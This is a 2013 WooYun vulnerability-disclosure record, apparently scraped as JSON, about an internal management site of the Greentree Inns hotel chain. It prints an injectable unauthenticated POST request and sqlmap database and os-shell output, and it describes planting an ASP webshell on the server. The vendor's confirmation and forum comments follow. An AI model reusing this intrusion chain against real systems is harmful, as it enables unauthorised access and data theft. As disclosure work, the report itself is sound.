{"id": 10471, "wybug_id": "wooyun-2013-028138", "wybug_title": "格林豪泰某重要站点一个越权引发的被沦陷血案", "wybug_corp": "格林豪泰酒店管理集团", "wybug_author": "小胖子", "wybug_date": "2013-07-08 09:52", "wybug_open_date": "2013-08-22 09:53", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["渗透测试思路", "管理后台对外", "安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-22：\t细节向公众公开  简要描述： 看到你们在线，就速度提交一个。免房卡？？ 详细说明：  重要站点是：http://mis.998.com/   MIS系统这个先不说，他关联了很多其他的系统。首先，无意间找到了一个越权访问的地址。http://mis.998.com/Portal/Workflow/Reports/QingXiaoJia.aspx不需要登录就可以使用。还能查询很多你们的员工的请假信息。然后抓包。\nPOST /Portal/Workflow/Reports/QingXiaoJia.aspx HTTP/1.1Host: mis.998.comProxy-Connection: keep-aliveContent-Length: 282Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Origin: http://mis.998.comUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31Content-Type: application/x-www-form-urlencodedReferer: http://mis.998.com/Portal/Workflow/Reports/QingXiaoJia.aspxAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Cookie: Hm_lvt_0e4a2c65bdaddd66a53422d93daebe68=1373239720,1373240429,1373240442,1373240464; Hm_lpvt_0e4a2c65bdaddd66a53422d93daebe68=1373241387; LXB_REFER=998.com__VIEWSTATE=%2FwEPDwUJODQ5MDA5ODY1ZGQ68LGgEAKwm2KxD8qjhtU7TpbyajGKplG2LRBv05Lm7w%3D%3D&TextBox_LiuChengZhuZhi=1&TextBox_LiShuBuMen=&TextBox_StartDate=2013-07-08&TextBox_EndDate=2013-07-08&DropDownList_QingJiaoLeiXing=%E4%B8%8D%E9%99%90&Button_Do=%E6%B1%87%E6%80%BB%E6%95%B0%E6%8D%AE\n其中post的参数可以注入，还好，不是盲注，而且，是DBA权限。\n\n其中的数据库哟，多得受不了。\navailable databases [14]:[*] crs_interface[*] distribution[*] ERP[*] ERPReport[*] ERPSession[*] H3[*] master[*] Mis[*] model[*] msdb[*] PerfmonDB[*] PersonnelOrganization[*] RequireManage[*] tempdb\n当前的数据库是H3，但是ERP的数据也在这个里面？貌似你们的会员密码是明文存储的，官网的找回密码功能就知道了。然后，DBA下看目录，看了N久，没有charset，居然还有乱码返回，不管了。\nos-shell> dir d:do you want to retrieve the command standard output? [Y/n/a] y[08:38:47] [INFO] the SQL query used returns 45 entries[08:38:48] [INFO] retrieved:[08:38:48] [INFO] retrieved:  ??????????????8 ??? ?7,098,409,422 ??[08:38:48] [INFO] retrieved:  ??????????????8 ??? ?7,098,409,422 ??[08:38:49] [INFO] retrieved:  ??????????????8 ??? ?7,098,409,422 ??[08:38:49] [INFO] retrieved:  ?????????????29 ??? 15,383,695,360 ????[08:38:49] [INFO] retrieved:  D:\\\\\\\\ ???[08:38:49] [INFO] retrieved:  ?????? 7C5B-1FF5[08:38:50] [INFO] retrieved:  ??? D ????????[08:38:50] [INFO] retrieved: 2010-05-28 ?11:21 ???<DIR> ?????????80a5bca67d35ac692c[08:38:50] [INFO] retrieved: 2010-06-07 ?10:43 ???<DIR> ?????????I386[08:38:50] [INFO] retrieved: 2010-10-13 ?14:53 ???<DIR> ?????????OThinker[08:38:51] [INFO] retrieved: 2010-12-17 ?10:36 ???<DIR> ?????????MisTest[08:38:51] [INFO] retrieved: 2011-02-14 ?13:58 ???<DIR> ?????????Interface_Test[08:38:51] [INFO] retrieved: 2011-04-14 ?09:32 ???<DIR> ?????????519DB[08:38:51] [INFO] retrieved: 2011-09-21 ?04:18 ???<DIR> ?????????DBAccessEngine[08:38:52] [INFO] retrieved: 2011-10-02 ?16:57 ???<DIR> ?????????SQL[08:38:52] [INFO] retrieved: 2011-10-12 ?16:31 ????????????1,876 SynLog.txt[08:38:52] [INFO] retrieved: 2011-10-21 ?14:15 ???<DIR> ?????????prepare[08:38:52] [INFO] retrieved: 2011-11-08 ?16:40 ???<DIR> ??????????????[08:38:53] [INFO] retrieved: 2011-11-10 ?10:47 ???<DIR> ?????????HotelCardTemp[08:38:53] [INFO] retrieved: 2011-11-17 ?09:33 ???<DIR> ???????????[08:38:53] [INFO] retrieved: 2011-11-21 ?18:05 ???<DIR> ?????????998_api_test[08:38:53] [INFO] retrieved: 2011-12-09 ?11:12 ???<DIR> ?????????rp[08:38:54] [INFO] retrieved: 2011-12-31 ?14:30 ???<DIR> ?????????Assess[08:38:54] [INFO] retrieved: 2011-12-31 ?16:11 ??????890,670,592 h3[08:38:54] [INFO] retrieved: 2012-01-01 ?13:55 ???<DIR> ?????????WoptiUtilities[08:38:54] [INFO] retrieved: 2012-01-13 ?09:37 ???<DIR> ?????????public[08:38:55] [INFO] retrieved: 2012-01-18 ?09:21 ????????????????0 ERPWindowServices.txt[08:38:55] [INFO] retrieved: 2012-01-31 ?16:36 ???<DIR> ?????????H3 Webconfig[08:38:55] [INFO] retrieved: 2012-02-20 ?18:39 ???<DIR> ?????????????[08:38:56] [INFO] retrieved: 2012-03-23 ?10:35 ??????????????844 AreaInfo.xml[08:38:56] [INFO] retrieved: 2012-03-23 ?10:35 ??????????162,455 HotelInfo.xml[08:38:56] [INFO] retrieved: 2012-04-07 ?11:54 ???<DIR> ?????????Program Files[08:38:57] [INFO] retrieved: 2012-08-24 ?16:56 ???<DIR> ?????????FTP[08:38:57] [INFO] retrieved: 2012-10-09 ?09:45 ???<DIR> ?????????20121009_??????[08:38:57] [INFO] retrieved: 2013-02-17 ?18:06 ???<DIR> ?????????ERP[08:38:57] [INFO] retrieved: 2013-03-04 ?11:20 ???<DIR> ?????????998_DataInterface[08:38:58] [INFO] retrieved: 2013-03-18 ?15:50 ???<DIR> ?????????FileUpTwo[08:38:58] [INFO] retrieved: 2013-04-27 ?10:08 ????6,207,536,853 ERP.rar[08:38:58] [INFO] retrieved: 2013-06-09 ?10:50 ???<DIR> ?????????GreenTreeInnSystem[08:38:58] [INFO] retrieved: 2013-07-02 ?15:36 ???<DIR> ?????????ATFiles[08:38:59] [INFO] retrieved: 2013-07-05 ?10:32 ????????????????0 FinanceCache.txt[08:38:59] [INFO] retrieved: 2013-07-08 ?00:08 ???<DIR> ?????????ConWeb[08:38:59] [INFO] retrieved: 2013-07-08 ?02:38 ???????????36,802 WindowsServerErrorLog.txt[08:38:59] [INFO] retrieved: 2013-07-08 ?02:38 ???<DIR> ?????????Mis_Datacommand standard output:--- ??????????????8 ??? ?7,098,409,422 ?? ??????????????8 ??? ?7,098,409,422 ?? ??????????????8 ??? ?7,098,409,422 ?? ?????????????29 ??? 15,383,695,360 ???? D:\\ ??? ?????? 7C5B-1FF5 ??? D ????????2010-05-28 ?11:21 ???<DIR> ?????????80a5bca67d35ac692c2010-06-07 ?10:43 ???<DIR> ?????????I3862010-10-13 ?14:53 ???<DIR> ?????????OThinker2010-12-17 ?10:36 ???<DIR> ?????????MisTest2011-02-14 ?13:58 ???<DIR> ?????????Interface_Test2011-04-14 ?09:32 ???<DIR> ?????????519DB2011-09-21 ?04:18 ???<DIR> ?????????DBAccessEngine2011-10-02 ?16:57 ???<DIR> ?????????SQL2011-10-12 ?16:31 ????????????1,876 SynLog.txt2011-10-21 ?14:15 ???<DIR> ?????????prepare2011-11-08 ?16:40 ???<DIR> ??????????????2011-11-10 ?10:47 ???<DIR> ?????????HotelCardTemp2011-11-17 ?09:33 ???<DIR> ???????????2011-11-21 ?18:05 ???<DIR> ?????????998_api_test2011-12-09 ?11:12 ???<DIR> ?????????rp2011-12-31 ?14:30 ???<DIR> ?????????Assess2011-12-31 ?16:11 ??????890,670,592 h32012-01-01 ?13:55 ???<DIR> ?????????WoptiUtilities2012-01-13 ?09:37 ???<DIR> ?????????public2012-01-18 ?09:21 ????????????????0 ERPWindowServices.txt2012-01-31 ?16:36 ???<DIR> ?????????H3 Webconfig2012-02-20 ?18:39 ???<DIR> ?????????????2012-03-23 ?10:35 ??????????????844 AreaInfo.xml2012-03-23 ?10:35 ??????????162,455 HotelInfo.xml2012-04-07 ?11:54 ???<DIR> ?????????Program Files2012-08-24 ?16:56 ???<DIR> ?????????FTP2012-10-09 ?09:45 ???<DIR> ?????????20121009_??????2013-02-17 ?18:06 ???<DIR> ?????????ERP2013-03-04 ?11:20 ???<DIR> ?????????998_DataInterface2013-03-18 ?15:50 ???<DIR> ?????????FileUpTwo2013-04-27 ?10:08 ????6,207,536,853 ERP.rar2013-06-09 ?10:50 ???<DIR> ?????????GreenTreeInnSystem2013-07-02 ?15:36 ???<DIR> ?????????ATFiles2013-07-05 ?10:32 ????????????????0 FinanceCache.txt2013-07-08 ?00:08 ???<DIR> ?????????ConWeb2013-07-08 ?02:38 ???????????36,802 WindowsServerErrorLog.txt2013-07-08 ?02:38 ???<DIR> ?????????Mis_Data---\nD盘下看到这个，果断找到web目录  GreenTreeInnSystem\\GreenTreeInn然后写马儿。\n\naspx写进去了，但是访问被强制跳转，后来看了下，貌似是webconfig限制。你们疏忽了，我写了个asp的文件。没有限制。http://mis.998.com/GreenTreeInn/wooyun.asp\n\n然后菜刀看了一下，权限大得惊人啊。   漏洞证明：  \n\n没动你们任何数据，请尽快修复。   修复方案：  0x1：越权访问什么的全部限制。0x2：aspx的程序，我看了下你们几乎都是aspx的，何必开放asp的权限。0x3：数据库权限太高了，降权吧。0x4：求礼物，没有礼物的话，20rank不能少吧！！！   版权声明：转载请注明来源 小胖子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-07-08 18:53 厂商回复： 感谢您对格林豪泰酒店管理集团的支持，我们会对此进行修复工作感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-08 10:00 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:143        | 心在，梦在)\t\t \n  哟喂，俺也来几发...    \n     2013-07-08 10:02 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @带馅儿馒头 哈哈，打炮啊，来几发~    \n     2013-07-08 10:35 |    \t\tleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:948 漏洞数:121        | 真的没影响么？)\t\t \n  @小胖子 都是酒店...    \n     2013-07-08 10:38 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @leaf 约炮啊亲！最近不好容易钓到一妹纸啊    \n     2013-07-08 10:45 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:143        | 心在，梦在)\t\t \n  @小胖子 先撸2发，看他们大方不：）    \n     2013-07-08 10:46 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @带馅儿馒头 我也还有存货啊~都是酒店的，我擦    \n     2013-07-08 10:51 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:143        | 心在，梦在)\t\t \n  @小胖子 擦，你开房开多了？    \n     2013-07-08 11:15 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @带馅儿馒头 @leaf @小胖子 你们一群坏人，又在这里集结    \n     2013-07-08 11:35 |    \t\tsuperbing \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:29        | 常羡古时儿女怀，嘻戏千山好自在。)\t\t \n   WooYun: 格林豪泰连锁酒店业务系统安全漏洞（绕过安全措施可致用户信息泄漏）  就同一个业务系统吧！下次乌云审核请别自作多情的改我的漏洞标题，我本来写的是某酒店的，审核我就不懂为啥你要改个格林豪泰。。导致格林豪泰被轮！好好反省下，之所以不写名字自然有我自己的道理！    \n     2013-07-08 11:54 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @superbing 首先，我可以肯定不是同一个，第二，也不是看了你的标题再去的，别人也不一定是看到你这个再去的，导致格林被轮，说得好像什么什么什么似得，你不发那个漏洞，就他现在的现状早迟都是被轮~    \n     2013-07-08 11:56 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:143        | 心在，梦在)\t\t \n  @xsser @superbing @小胖子 胖子牛说的是，我们是检测，又没干什么坏事...说的wooyun把他们怎么样了是的，免费的渗透测试呀，可是，，，而且我们都是点到为止。。。    \n     2013-07-08 12:13 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @superbing 看看乌云标准的漏洞标题啊 如果都写某企业某系统某漏洞 你看看会如何......    \n     2013-07-08 14:19 |    \t\tLee Swagger \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:5        | 洗洗睡吧)\t\t \n  @xsser 万人骑？    \n     2013-07-08 14:54 |    \t\tsuperbing \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:29        | 常羡古时儿女怀，嘻戏千山好自在。)\t\t \n  好吧！你们就当我没说吧！从漏洞标题可以看出一个人的心境。首先我只是想冲下普通白帽子提早看下别人的漏洞才发了几个漏洞。其次作为白帽子貌似可以低调点吧！要那么响亮的标题做啥？求膜拜？得了吧！虚拟的网络膜拜个啥？有成就感啦？漏洞过程都差不多，手法都差不多，你要被膜拜天天发几个不就得了！反正目标随意！要刷分还不容易！低调！兄弟们！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}